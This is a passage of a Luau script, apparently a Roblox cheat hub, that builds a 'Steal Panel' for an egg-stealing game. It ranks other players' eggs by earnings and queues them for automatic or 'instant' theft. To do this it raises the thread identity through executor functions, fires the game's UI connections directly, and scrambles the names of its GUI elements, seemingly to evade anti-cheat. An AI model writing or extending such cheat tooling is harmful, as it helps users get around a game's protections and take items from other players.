		local eggPropsCache = {}
		local rarityGradients = nil

		getEggProps = function(assetCategory)
			local cached = eggPropsCache[assetCategory]
			if cached then
				return cached
			end
			local directory = gameModules.Assets and gameModules.Assets.Directory
			local assetConfig = type(directory) == "table" and directory[assetCategory] or nil
			local rarity = type(assetConfig) == "table" and type(assetConfig.Rarity) == "table" and assetConfig.Rarity or nil
			local rarityGradient = rarity and rarity.RarityGradient or nil

			if rarity and typeof(rarityGradient) ~= "Instance" then
				if rarityGradients == nil then
					local assets = ReplicatedStorage:FindFirstChild("Assets")
					assets = assets and assets:FindFirstChild("UI")
					rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
				end

				rarityGradient = rarityGradients

				if rarityGradients then
					rarityGradient = rarityGradients:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			local rarityName

			if rarity then
				rarityName = tostring(rarity.DisplayName or rarity._id or "")
			else
				rarityName = rarity
			end

			rarityName = rarityName or ""
			local rarityColor = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or color3(255, 255, 255)
			local gradientSequence = createColorSequence({ { 0, rarityColor }, { 1, rarityColor } })
			local gradientRotation

			if string.upper(rarityName) == "SECRET" then
				gradientRotation = 90
				gradientSequence = secretGradientColors
			else
				local isUIGradient = typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient")
				gradientRotation = 90

				if isUIGradient then
					gradientSequence = rarityGradient.Color
					gradientRotation = rarityGradient.Rotation
				end
			end

			local icon = type(assetConfig) == "table" and assetConfig.Icon or nil

			if tonumber(icon) then
				icon = "rbxassetid://" .. tostring(icon)
			end

			local props = {}
			local isConfigTable = type(assetConfig) == "table"
			local displayName

			if isConfigTable then
				displayName = tostring(assetConfig.DisplayName or assetCategory)
			else
				displayName = isConfigTable
			end

			props.Name = displayName or tostring(assetCategory)
			props.Icon = icon and tostring(icon) or ""
			local rarityNumber

			if rarity then
				rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
			else
				rarityNumber = rarity
			end

			props.RarityNumber = rarityNumber or 0
			props.GradientColor = gradientSequence
			props.GradientRotation = gradientRotation
			props.EarningRate = type(assetConfig) == "table" and tonumber(assetConfig.EarningRate) or 0
			eggPropsCache[assetCategory] = props
			return props
		end
	end

	local calculateEggEarnings = function(eggInfo, eggProps)
		local eggScale = tonumber(eggInfo.AssetScale) or 1
		local scaleMultiplier = eggScale > 5 and (eggScale / 5) ^ 1.2 * 19.637875755794113 or eggScale ^ 1.85
		local mutations = type(eggInfo.Mutations) == "table" and eggInfo.Mutations or {}

		if #mutations == 0 and type(eggInfo.BaseMutation) == "string" and eggInfo.BaseMutation ~= "" then
			mutations = { eggInfo.BaseMutation }
		end

		local mutationsMod = gameModules.Mutations
		local isEarningsFunc = type(mutationsMod) == "table" and type(mutationsMod.EarningsFor) == "function"
		local earningsMultiplier = 1

		if isEarningsFunc then
			local ok, result = pcall(mutationsMod.EarningsFor, mutations)
			ok = ok and type(result) == "number"

			if ok then
				earningsMultiplier = result
			else
				earningsMultiplier = 1
			end
		end

		return eggProps.EarningRate * scaleMultiplier * earningsMultiplier
	end

	local formatEarningsRate
	local formatSuffixes = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx" }

	formatEarningsRate = function(value)
		local num = tonumber(value) or 0
		local index = 1

		while num >= 1000 and index < #formatSuffixes do
			num /= 1000
			index += 1
		end

		local formattedNum = index == 1 and tostring(math.floor(num)) or string.format("%.1f", math.floor(num * 10) / 10)
		local rateSuffix = formatSuffixes[index] .. "/s"
		return "$" .. string.gsub(formattedNum, "%.0$", "") .. rateSuffix
	end

	local function updateTextLabel(arg, text)
		if arg and arg.Text ~= text then
			arg.Text = text
		end
	end

	local isPanelInitialized = false
	local panelUpdateTimer = 0
	local isPanelVisible = false
	local uiElementsCache = nil
	local stealPanel = nil
	local stealPanelToggleButton = nil
	local panelBackgroundImage = nil
	local eggListContainer = nil
	local eggListLayout = nil
	local panelPosition = nil
	local panelTitle = nil
	local eggsAmountText = nil
	local earningsText = nil
	local eggEntryTemplate = nil
	local isSnatcherActive = false
	local stealPanelToggleState = hubWindow:CreateState({ Name = "Steal Panel Open", Default = true })
	local panelAnimating = false
	local panelTween = nil
	local columnTween = nil
	local eggCount = 0
	local autoStealControls = nil
	local eggEntryCache = nil
	local eggEntryCount = 1
	local eggEntryPool = {}
	local queuedEggsList = {}
	local activeSnatchTasks = {}
	local snatcherPanelGui = nil
	local snatcherPanelFrame = nil
	local snatcherPanelPosition = nil
	local uiConnections = {}
	local sortButtonStruct = nil
	local sortToggleBtnStruct = nil
	local autoStealControlsStruct = { AutoSteal = false, Guard = nil, GuardOn = nil, SortShown = nil }
	local snapshotMaxDuration = 4
	local panelSlideOffsetMultiplier = 1.392
	local panelTargetWidth = 1.03
	local panelBaseWidth = 1.03
	local panelBaseHeight = 1.392
	local eggProcessYieldInterval = 0.002
	local eggEntryWidthDivisor = 4.4262295081967213
	local eggEntryHeight = 50
	local shouldStartPerformanceMonitor = false
	local startPerformanceMonitor = function() end
	local columnOffsetMultiplier = 1.03
	local uiStrokesList, thickness, isEggUpdateScheduled, isThrottlingProcess, hasQueuedRetry, lastProcessTime, findGameUIElements, cloneAndCleanInstance, scrambleNames, baseResolutions
	local toggleButtonGui, toggleButtonStruct, originalAspectRatio, isEggUpdatePending, uiStroke, setupSnatcherUI
	local applyUiStrokes, resizeUiStrokes

	do
		local weakTableCache = setmetatable({}, { __mode = "k" })
		uiStrokesList = weakTableCache
		thickness = nil
		isEggUpdateScheduled = false
		isThrottlingProcess = false
		hasQueuedRetry = false
		lastProcessTime = 0

		findGameUIElements = function()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local hud = playerGui and playerGui:FindFirstChild("HUD")
			local gameHUD = hud and hud:FindFirstChild("GameHUD")
			local rightButtons = gameHUD and gameHUD:FindFirstChild("RightButtons")
			local activePets = playerGui and playerGui:FindFirstChild("ActivePets")

			local uiElements = {
				Hud = hud,
				GameHud = gameHUD,
				Column = rightButtons,
				Eggs = rightButtons and rightButtons:FindFirstChild("EggsButton"),
				Pets = rightButtons and rightButtons:FindFirstChild("PetsButton"),
				ActivePets = activePets,
				GrowingEggs = playerGui and playerGui:FindFirstChild("GrowingEggs"),
			}

			if not (hud and gameHUD and rightButtons and uiElements.Eggs and uiElements.Pets and activePets and activePets:FindFirstChild("Frame")) then
				return nil
			end
			return uiElements
		end

		cloneAndCleanInstance = function(instance)
			local ok, result = pcall(function()
				return instance:Clone()
			end)

			if not ok or typeof(result) ~= "Instance" then
				return nil
			end

			for _, descendant in ipairs(result:GetDescendants()) do
				if descendant:IsA("LuaSourceContainer") then
					descendant:Destroy()
				end
			end

			return result
		end

		scrambleNames = function(instance)
			instance.Name = generateRandomKey()

			for _, descendant in ipairs(instance:GetDescendants()) do
				descendant.Name = generateRandomKey()
			end
		end

		local baseScaleRatio = 2.3120369911193848
		local panelReferenceWidth = 556
		local buttonReferenceSize = 86.24
		baseResolutions = { Panel = baseScaleRatio, Hud = baseScaleRatio }

		local function calculateUIPanelScale(forPanel)
			if forPanel then
				local layoutWidth = eggListLayout and eggListLayout.AbsoluteSize.X or 0
				return layoutWidth > 0 and baseScaleRatio * layoutWidth / panelReferenceWidth or nil
			end
			local button = stealPanelToggleButton and stealPanelToggleButton.Button
			button = button and button.Size.X.Offset or 0
			return button > 0 and baseScaleRatio * button / buttonReferenceSize or nil
		end

		local function applyScaledThickness(uiStroke, strokeInfo)
			local scale = calculateUIPanelScale(strokeInfo.Panel)

			if scale and uiStroke.Parent then
				uiStroke.Thickness = strokeInfo.Ratio * scale
			end
		end

		applyUiStrokes = function(rootInstance, isPanel)
			local baseScale = isPanel and baseResolutions.Panel or baseResolutions.Hud

			if not baseScale or baseScale <= 0 then
				baseScale = 2.3120369911193848
			end

			for _, descendant in ipairs(rootInstance:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					local ok, result = pcall(function()
						return descendant.StrokeSizingMode
					end)

					if not ok or result ~= Enum.StrokeSizingMode.ScaledSize then
						local uiInfo = { Ratio = descendant.Thickness / baseScale, Panel = isPanel == true }
						uiStrokesList[descendant] = uiInfo
						applyScaledThickness(descendant, uiInfo)
					end
				end
			end
		end

		resizeUiStrokes = function()
			for k, uiInfo in pairs(uiStrokesList) do
				applyScaledThickness(k, uiInfo)
			end
		end
	end

	local triggerStrokeResize

	triggerStrokeResize = function()
		resizeUiStrokes()
	end

	local createButtonStruct

	createButtonStruct = function(arg)
		if not arg then
			return nil
		end

		return {
			Button = arg,
			Gradient = arg:FindFirstChildOfClass("UIGradient"),
			Stroke = arg:FindFirstChild("UIStroke"),
			Light = arg:FindFirstChild("UIStrokeClr"),
			Label = arg:FindFirstChild("Label") or arg:FindFirstChild("TextLabel"),
			Scale = arg:FindFirstChild("BtnScale"),
		}
	end

	local applyButtonStyle

	applyButtonStyle = function(buttonStruct, style)
		if not buttonStruct or buttonStruct.Style == style then
			return
		end
		buttonStruct.Style = style

		if buttonStruct.Gradient then
			buttonStruct.Gradient.Color = style.Color
			buttonStruct.Gradient.Rotation = style.Rotation
		end

		if buttonStruct.Stroke then
			buttonStruct.Stroke.Color = style.Stroke
		end

		if buttonStruct.Light then
			buttonStruct.Light.Color = style.Light
		end
	end

	local bindButtonHover

	bindButtonHover = function(buttonStruct)
		if not buttonStruct then
			return
		end
		local scale = buttonStruct.Scale

		if not scale then
			scale = Instance.new("UIScale")
			scale.Parent = buttonStruct.Button
			buttonStruct.Scale = scale
		end

		local function animateScale(targetScale)
			TweenService:Create(scale, tweenInfo5, { Scale = targetScale }):Play()
		end

		buttonStruct.Button.MouseEnter:Connect(function()
			animateScale(1.08)
		end)

		buttonStruct.Button.MouseLeave:Connect(function()
			animateScale(1)
		end)

		buttonStruct.Button.MouseButton1Down:Connect(function()
			animateScale(0.94)
		end)

		buttonStruct.Button.MouseButton1Up:Connect(function()
			animateScale(1.08)
		end)
	end

	local animateButtonGradient

	do
		local gradientTweenInfo = TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local rotationTweenInfo = TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local colorTweenInfo = TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local activeTweens = {}

		animateButtonGradient = function(buttonStruct)
			for _, tw in ipairs(activeTweens) do
				pcall(function()
					tw:Cancel()
				end)
			end

			table.clear(activeTweens)
			if not buttonStruct then
				return
			end

			local function playAndTrack(tw)
				activeTweens[#activeTweens + 1] = tw
				tw:Play()
			end

			local gradient = buttonStruct.Gradient

			if gradient then
				gradient.Rotation = -115
				gradient.Offset = Vector2.new(-0.30000001192092896, 0)
				playAndTrack(TweenService:Create(gradient, gradientTweenInfo, { Offset = Vector2.new(0.30000001192092896, 0) }))
				playAndTrack(TweenService:Create(gradient, rotationTweenInfo, { Rotation = -65 }))
			end

			local light = buttonStruct.Light

			if light then
				light.Color = color3(226, 178, 255)
				playAndTrack(TweenService:Create(light, colorTweenInfo, { Color = color3(255, 245, 255) }))
			end
		end
	end

	do
		local setIdentity = setthreadidentity or set_thread_identity

		local function fetchFieldEggsSnapshot()
			local records = fetchFieldEggs()
			if type(setIdentity) == "function" then
				pcall(setIdentity, 8)
			end
			if records then
				return records
			end

			local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
			if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				return nil
			end
			local snapshotFinished = false
			local records = nil

			task.spawn(function()
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					records = result.Records
				end

				snapshotFinished = true
			end)

			local now = os.clock()

			while not snapshotFinished and os.clock() - now < snapshotMaxDuration do
				RunService.Heartbeat:Wait()
			end

			return records
		end

		local function isAnyMenuOpen()
			local isOpen = uiElementsCache ~= nil

			if isOpen then
				isOpen = uiElementsCache.ActivePets and uiElementsCache.ActivePets.Enabled or uiElementsCache.GrowingEggs and uiElementsCache.GrowingEggs.Enabled
			end

			return isOpen or false
		end

		local function forceCloseMenus()
			local wereMenusClosed = false

			for _, menu in ipairs({ uiElementsCache.ActivePets, uiElementsCache.GrowingEggs }) do
				if menu and menu.Enabled then
					local frame = menu:FindFirstChild("Frame")
					frame = frame and frame:FindFirstChild("Close")
					local canReadConnections = frame and typeof(getconnections) == "function"
					local didClickClose = false

					if canReadConnections then
						local ok, result = pcall(getconnections, frame.Activated)
						local hasConnections = ok and type(result) == "table"
						local fallbackClick = false

						if hasConnections then
							local connectionIter, connectionState, connectionIdx = ipairs(result)
							local clicked = false

							for _, conn in connectionIter, connectionState, connectionIdx do
								if pcall(function()
									conn:Fire()
								end) then
									clicked = true
								end
							end

							didClickClose = clicked
						else
							didClickClose = fallbackClick
						end
					end

					if not didClickClose then
						menu.Enabled = false
					end

					wereMenusClosed = true
				end
			end

			return wereMenusClosed
		end

		local function animateGameHudColumn(shouldShow, disableAnimation)
			local column = uiElementsCache and uiElementsCache.Column
			if not column or not column.Parent then
				return
			end

			if columnTween then
				columnTween:Cancel()
				columnTween = nil
			end

			local currentPosition = column.Position
			local targetPos = UDim2.new(currentPosition.X.Scale, shouldShow and math.ceil(column.AbsoluteSize.X * columnOffsetMultiplier) or 0, currentPosition.Y.Scale, currentPosition.Y.Offset)
			if disableAnimation then
				column.Position = targetPos
				return
			end
			columnTween = TweenService:Create(column, shouldShow and tweenInfo3 or tweenInfo4, { Position = targetPos })
			columnTween:Play()
		end

		local panelWidthReduction = 0.106
		local panelSizeFullscreen = UDim2.new(0.955, 0, 0.6, 0)
		local panelSizeReduced = UDim2.new(0.955 - panelWidthReduction, 0, 0.6, 0)
		local panelSizeSmall = UDim2.new(0.2, 0, 0.56, 0)
		local panelScaleReduced = 0.955 - panelWidthReduction

		local function setButtonVisibility(buttonStruct, visible)
			if buttonStruct and buttonStruct.Button.Visible ~= visible then
				buttonStruct.Button.Visible = visible
			end
		end

		local function updateEggItemUI(eggEntry, rank, badgeStyle, targetRank)
			local visible = rank ~= nil
			eggEntry.Rank = rank
			setButtonVisibility(eggEntry.Steal, not visible)
			setButtonVisibility(eggEntry.Up, visible)
			setButtonVisibility(eggEntry.Down, visible)
			setButtonVisibility(eggEntry.Cancel, visible)

			if visible then
				applyButtonStyle(eggEntry.Up, rank > 1 and stateThemes.Hud or stateThemes.Queued)
				applyButtonStyle(eggEntry.Down, rank < (targetRank or rank) and stateThemes.Hud or stateThemes.Queued)
			end

			applyButtonStyle(eggEntry.Star, rank == 1 and stateThemes.PriorityOn or stateThemes.Queued)

			if eggEntry.Badge then
				if eggEntry.Badge.Visible ~= visible then
					eggEntry.Badge.Visible = visible
				end

				if visible then
					updateTextLabel(eggEntry.Badge, "#" .. rank)
					badgeStyle = badgeStyle and stateThemes.Steal or stateThemes.PriorityOn

					if eggEntry.BadgeStyle ~= badgeStyle and eggEntry.BadgeGradient then
						eggEntry.BadgeStyle = badgeStyle
						eggEntry.BadgeGradient.Color = badgeStyle.Color
						eggEntry.BadgeGradient.Rotation = 90
					end
				end
			end
		end

		local function updateAutoStealToggle()
			if not autoStealControls then
				return
			end
			local autoStealActive = chilliState.Toggle(autoStealToggle, false)

			if autoStealControls.On ~= autoStealActive then
				autoStealControls.On = autoStealActive
				applyButtonStyle(autoStealControls.Toggle, autoStealActive and stateThemes.Steal or stateThemes.Cancel)
				updateTextLabel(autoStealControls.Toggle.Label, autoStealActive and "Auto Steal: ON" or "Auto Steal: OFF")
			end

			local guardOn = chilliState.SafeCarry.LineDrop == true

			if autoStealControlsStruct.Guard and autoStealControlsStruct.GuardOn ~= guardOn then
				autoStealControlsStruct.GuardOn = guardOn
				applyButtonStyle(autoStealControlsStruct.Guard, guardOn and stateThemes.Steal or stateThemes.Cancel)
				updateTextLabel(autoStealControlsStruct.Guard.Label, guardOn and "Instant Steal: ON" or "Instant Steal: OFF")
			end

			if sortButtonStruct and autoStealControlsStruct.SortShown ~= selectedSortPriority then
				autoStealControlsStruct.SortShown = selectedSortPriority
				updateTextLabel(sortButtonStruct.Label, "Sort: " .. tostring(selectedSortPriority))
			end
		end

		local cancelCooldownDuration = 4
		local cancelCooldowns = {}
		local eggSortOrders = {}

		local function refreshEggList()
			if not eggListContainer then
				return
			end
			updateAutoStealToggle()
			local eggsToSort = {}

			for _, queuedEgg in pairs(queuedEggsList) do
				table.insert(eggsToSort, queuedEgg)
			end

			local stealPlan = {}
			local targetEgg = nil

			if type(chilliState.StealPlan) == "function" then
				task.spawn(function()
					local ok, result, result2 = pcall(chilliState.StealPlan)

					if ok and type(result) == "table" then
						stealPlan = result
						targetEgg = result2
					end
				end)
			end

			local eggPriorities = {}

			for i, eggUid in ipairs(stealPlan) do
				if eggPriorities[eggUid] == nil then
					eggPriorities[eggUid] = i
				end
			end

			local currentSort = selectedSortPriority

			table.sort(eggsToSort, function(eggDataA, eggDataB)
				local p1 = eggPriorities[eggDataA.Uid]
				local p2 = eggPriorities[eggDataB.Uid]
				if p1 ~= nil ~= p2 ~= nil then
					return p1 ~= nil
				end

				if p1 and p2 then
					return p1 < p2
				end

				if currentSort == sortPriorityOptions[1] and eggDataA.Style.RarityNumber ~= eggDataB.Style.RarityNumber then
					return eggDataA.Style.RarityNumber > eggDataB.Style.RarityNumber
				end
				local isWeightSort = currentSort == sortPriorityOptions[2]

				if isWeightSort then
					isWeightSort = (eggDataA.Weight or 0) ~= (eggDataB.Weight or 0)
				end

				if isWeightSort then
					return (eggDataA.Weight or 0) > (eggDataB.Weight or 0)
				end

				if currentSort == sortPriorityOptions[5] and eggDataA.Value ~= eggDataB.Value then
					return eggDataA.Value < eggDataB.Value
				end

				if eggDataA.Value ~= eggDataB.Value then
					return eggDataA.Value > eggDataB.Value
				end
				return eggDataA.Uid < eggDataB.Uid
			end)

			local now = os.clock()
			local sortedEggs = {}
			local cooldownEggs = {}

			for _, eggData in ipairs(eggsToSort) do
				local cd = cancelCooldowns[eggData.Uid]

				if cd and cd > now and eggSortOrders[eggData.Uid] then
					table.insert(cooldownEggs, eggData)
				else
					cancelCooldowns[eggData.Uid] = nil
					table.insert(sortedEggs, eggData)
				end
			end

			table.sort(cooldownEggs, function(eggDataA, eggDataB)
				return eggSortOrders[eggDataA.Uid] < eggSortOrders[eggDataB.Uid]
			end)

			for _, eggData in ipairs(cooldownEggs) do
				table.insert(sortedEggs, math.clamp(eggSortOrders[eggData.Uid], 1, #sortedEggs + 1), eggData)
			end

			table.clear(eggSortOrders)

			for i, eggData in ipairs(sortedEggs) do
				eggSortOrders[eggData.Uid] = i
				local entry = eggEntryPool[eggData.Uid]

				if entry then
					if entry.Frame.LayoutOrder ~= i then
						entry.Frame.LayoutOrder = i
					end

					updateEggItemUI(entry, eggPriorities[eggData.Uid], eggData.Uid == targetEgg, #stealPlan)
				end
			end
		end

		local function updateEggEntryHeight()
			if not eggListContainer then
				return
			end
			local newHeight = math.max(1, math.floor(eggListContainer.AbsoluteSize.X / eggEntryWidthDivisor + 0.5))
			if newHeight == eggEntryHeight then
				return
			end
			eggEntryHeight = newHeight

			for _, entry in pairs(eggEntryPool) do
				entry.Frame.Size = UDim2.new(1, 0, 0, newHeight)
			end
		end

		local function createEggEntry(uid)
			local clone = eggEntryTemplate:Clone()
			local spacer = clone:FindFirstChild("Spacer")
			local textLabel = spacer:FindFirstChild("TextLabel")

			local entry = {
				Uid = uid,
				Frame = clone,
				Icon = spacer:FindFirstChild("Icon"),
				Label = textLabel,
				ValueLabel = spacer:FindFirstChild("Value"),
				DetailLabel = spacer:FindFirstChild("Detail"),
			}

			entry.Gradient = textLabel and textLabel:FindFirstChildOfClass("UIGradient")
			entry.Steal = createButtonStruct(spacer:FindFirstChild("Unequip"))
			entry.Cancel = createButtonStruct(spacer:FindFirstChild("Cancel"))
			entry.Star = createButtonStruct(spacer:FindFirstChild("Star"))
			entry.Up = createButtonStruct(spacer:FindFirstChild("Up"))
			entry.Down = createButtonStruct(spacer:FindFirstChild("Down"))
			entry.Badge = spacer:FindFirstChild("Rank")
			entry.BadgeGradient = entry.Badge and entry.Badge:FindFirstChildOfClass("UIGradient") or nil

			if textLabel and not entry.Gradient then
				entry.Gradient = Instance.new("UIGradient")
				entry.Gradient.Parent = textLabel
			end

			bindButtonHover(entry.Steal)
			bindButtonHover(entry.Cancel)
			bindButtonHover(entry.Star)
			bindButtonHover(entry.Up)
			bindButtonHover(entry.Down)

			for _, dirAction in ipairs({ { entry.Up, -1 }, { entry.Down, 1 } }) do
				if dirAction[1] then
					dirAction[1].Button.Activated:Connect(function()
						if type(chilliState.MoveInPlan) == "function" then
							chilliState.MoveInPlan(entry.Uid, dirAction[2])
						end

						chilliState.UiDefer(refreshEggList)
					end)
				end
			end

			if entry.Steal then
				entry.Steal.Button.Activated:Connect(function()
					if entry.Rank == nil and type(chilliState.StealNow) == "function" then
						chilliState.StealNow(entry.Uid, false)
					end

					chilliState.UiDefer(refreshEggList)
				end)
			end

			if entry.Cancel then
				entry.Cancel.Button.Activated:Connect(function()
					cancelCooldowns[entry.Uid] = os.clock() + cancelCooldownDuration

					if type(chilliState.CancelSteal) == "function" then
						chilliState.CancelSteal(entry.Uid)
					end

					chilliState.UiDefer(refreshEggList)
				end)
			end

			if entry.Star then
				entry.Star.Button.Activated:Connect(function()
					if type(chilliState.PrioritizeSteal) == "function" then
						chilliState.PrioritizeSteal(entry.Uid)
					end

					chilliState.UiDefer(refreshEggList)
				end)
			end

			applyUiStrokes(clone, true)
			scrambleNames(clone)
			clone.Size = UDim2.new(1, 0, 0, math.max(eggEntryHeight, 1))
			clone.Visible = true
			clone.Parent = eggListContainer
			return entry
		end

		local function updateEggEntryData(entry, eggData)
			local style = eggData.Style

			if entry.Category ~= eggData.Category then
				entry.Category = eggData.Category

				if entry.Icon then
					entry.Icon.Image = style.Icon
				end

				if entry.Gradient then
					entry.Gradient.Color = style.GradientColor
					entry.Gradient.Rotation = style.GradientRotation
				end
			end

			updateTextLabel(entry.Label, style.Name)
			updateTextLabel(entry.ValueLabel, formatEarningsRate(eggData.Value))
			updateTextLabel(entry.DetailLabel, eggData.Detail or "")
		end

		local function formatWeight(weightValue)
			local num = tonumber(weightValue) or 0
			local str = num >= 1000 and string.format("%.0f", num) or string.format("%.2f", num)
			local whole, decimal = string.match(str, "^(%-?%d+)(%.%d+)$")
			whole = whole or str
			local result

			while true do
				local matchCount
				result, matchCount = string.gsub(whole, "^(%-?%d+)(%d%d%d)", "%1,%2")

				if matchCount == 0 then
					break
				else
					whole = result
				end
			end

			return result .. (decimal or "") .. " Kg"
		end

		local function getEggScaleAndWeight(assetCategory, assetScale)
			local str = string.format("x%.2f", assetScale)
			local eggRecords = gameModules.EggRecords
			local hasWeightFunc = type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function"
			local weight = 0

			if hasWeightFunc then
				local ok, result = pcall(eggRecords.WeightKgForScale, assetCategory, assetScale)

				if ok and tonumber(result) then
					weight = tonumber(result)
					str ..= "  " .. utf8.char(183) .. "  " .. formatWeight(result)
				end
			end

			return str, weight
		end

		local triggerNextEggUpdate = nil

		local function processFieldEggs(timerTick)
			local records = fetchFieldEggsSnapshot()

			if records and timerTick == panelUpdateTimer and isPanelInitialized then
				local processedEggIds = {}
				local now = os.clock()
				local maxVal = -1
				local bestEgg = nil

				for _, eggData in pairs(records) do
					local uid = type(eggData) == "table" and eggData.Uid or nil
					local isValidState = eggData.State == "Slot" or eggData.State == "Dropped" or eggData.State == "Carried"

					if type(uid) == "string" and isValidState and type(eggData.AssetCategory) == "string" then
						processedEggIds[uid] = true
						local style = getEggProps(eggData.AssetCategory)
						local queuedEgg = queuedEggsList[uid]

						if not queuedEgg then
							queuedEgg = { Uid = uid }
							queuedEggsList[uid] = queuedEgg
						end

						local scale = tonumber(eggData.AssetScale) or 1

						if queuedEgg.Detail == nil or queuedEgg.Scale ~= scale or queuedEgg.Category ~= eggData.AssetCategory then
							queuedEgg.Scale = scale
							local detailStr, weightNum = getEggScaleAndWeight(eggData.AssetCategory, scale)
							queuedEgg.Detail = detailStr
							queuedEgg.Weight = weightNum
						end

						queuedEgg.Category = eggData.AssetCategory
						queuedEgg.Style = style
						queuedEgg.Value = calculateEggEarnings(eggData, style)
						queuedEgg.Position = typeof(eggData.BottomCFrame) == "CFrame" and eggData.BottomCFrame.Position or nil

						if (eggData.State == "Slot" or eggData.State == "Dropped") and style.Icon ~= "" and queuedEgg.Value > maxVal then
							maxVal = queuedEgg.Value
							bestEgg = queuedEgg
						end

						if isSnatcherActive and eggListContainer then
							local entry = eggEntryPool[uid]

							if not entry then
								local newEntry = createEggEntry(uid)
								eggEntryPool[uid] = newEntry
								entry = newEntry
							end

							updateEggEntryData(entry, queuedEgg)
						end
					end

					if not (eggProcessYieldInterval < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if timerTick ~= panelUpdateTimer or not isPanelInitialized then
						return
					end
				end

				for k in pairs(queuedEggsList) do
					if not processedEggIds[k] then
						queuedEggsList[k] = nil
						local entry = eggEntryPool[k]

						if entry then
							eggEntryPool[k] = nil
							entry.Frame:Destroy()
						end
					end
				end

				if panelBackgroundImage and bestEgg and panelBackgroundImage.Image ~= bestEgg.Style.Icon then
					panelBackgroundImage.Image = bestEgg.Style.Icon
				end

				refreshEggList()
			end
		end

		local function throttledProcessFieldEggs(timerTick)
			if isThrottlingProcess and os.clock() - lastProcessTime < 10 then
				hasQueuedRetry = true
				return
			end
			isThrottlingProcess = true
			lastProcessTime = os.clock()
			pcall(processFieldEggs, timerTick)

			if lastProcessTime == lastProcessTime then
				isThrottlingProcess = false
			end

			if hasQueuedRetry then
				hasQueuedRetry = false
				triggerNextEggUpdate()
			end
		end

		triggerNextEggUpdate = function()
			if isEggUpdateScheduled or not isPanelInitialized then
				return
			end
			isEggUpdateScheduled = true
			local currentTimerTick = panelUpdateTimer

			task.delay(isSnatcherActive and 0.15 or 1, function()
				isEggUpdateScheduled = false

				if isPanelInitialized and currentTimerTick == panelUpdateTimer then
					task.spawn(pcall, throttledProcessFieldEggs, currentTimerTick)
				end
			end)
		end

		local function openSnatcherPanel(skipTween)
			if isSnatcherActive or not snatcherPanelFrame then
				return
			end
			isSnatcherActive = true

			if skipTween then
				stealPanelToggleState:Set(true)
			end

			if forceCloseMenus() then
				RunService.Heartbeat:Wait()
				if not isSnatcherActive or not snatcherPanelFrame then
					return
				end
			end

			animateGameHudColumn(true)
			snatcherPanelGui.Enabled = true

			if panelTween then
				panelTween:Cancel()
			end

			local scale = snatcherPanelPosition.Y.Scale
			local offset = snatcherPanelPosition.Y.Offset
			snatcherPanelFrame.Position = UDim2.new(snatcherPanelPosition.X.Scale, math.ceil(snatcherPanelFrame.AbsoluteSize.X * panelSlideOffsetMultiplier), scale, offset)
			panelTween = TweenService:Create(snatcherPanelFrame, tweenInfo, { Position = snatcherPanelPosition })
			panelTween:Play()
			triggerStrokeResize()
			updateEggEntryHeight()
			task.spawn(pcall, throttledProcessFieldEggs, panelUpdateTimer)
		end

		local function closeSnatcherPanel(disableHudAnimation, skipTween)
			if not isSnatcherActive or not snatcherPanelFrame then
				return
			end
			isSnatcherActive = false

			if skipTween then
				stealPanelToggleState:Set(false)
			end

			if panelTween then
				panelTween:Cancel()
			end

			local scale = snatcherPanelPosition.Y.Scale
			local offset = snatcherPanelPosition.Y.Offset
			local outTween = TweenService:Create(snatcherPanelFrame, tweenInfo2, { Position = UDim2.new(snatcherPanelPosition.X.Scale, math.ceil(snatcherPanelFrame.AbsoluteSize.X * panelSlideOffsetMultiplier), scale, offset) })
			panelTween = outTween

			outTween.Completed:Connect(function(playbackState)
				if playbackState == Enum.PlaybackState.Completed and panelTween == outTween and not isSnatcherActive and snatcherPanelGui then
					snatcherPanelGui.Enabled = false
					snatcherPanelFrame.Position = snatcherPanelPosition
				end
			end)

			outTween:Play()

			if disableHudAnimation then
				animateGameHudColumn(false)
			end
		end

		local function createScreenGui(guiConfig)
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = generateRandomKey()
			screenGui.Archivable = false
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = guiConfig.IgnoreGuiInset
			screenGui.ZIndexBehavior = guiConfig.ZIndexBehavior
			screenGui.DisplayOrder = guiConfig.DisplayOrder

			pcall(function()
				screenGui.ScreenInsets = guiConfig.ScreenInsets
			end)

			return screenGui
		end

		local function initializeSnatcherToggleButton()
			if toggleButtonGui and toggleButtonGui.Parent and toggleButtonStruct and toggleButtonStruct.Button then
				return true
			end
			local clonedBtn = cloneAndCleanInstance(uiElementsCache.Pets)
			if not clonedBtn then
				return false
			end

			for _, childName in ipairs({ "Notification", "ReadyNotification", "NightImage", "NightText", "ConsoleButton", "Badge" }) do
				local child = clonedBtn:FindFirstChild(childName)

				if child then
					child:Destroy()
				end
			end

			toggleButtonStruct = createButtonStruct(clonedBtn)
			panelBackgroundImage = clonedBtn:FindFirstChild("ImageLabel")

			if toggleButtonStruct.Scale then
				toggleButtonStruct.Scale.Scale = 1
			end

			applyButtonStyle(toggleButtonStruct, stateThemes.Chilli)
			bindButtonHover(toggleButtonStruct)
			animateButtonGradient(toggleButtonStruct)
			clonedBtn.AnchorPoint = Vector2.new(0.5, 0.5)
			clonedBtn.LayoutOrder = 0

			clonedBtn.Activated:Connect(function()
				chilliState.UiDefer(function()
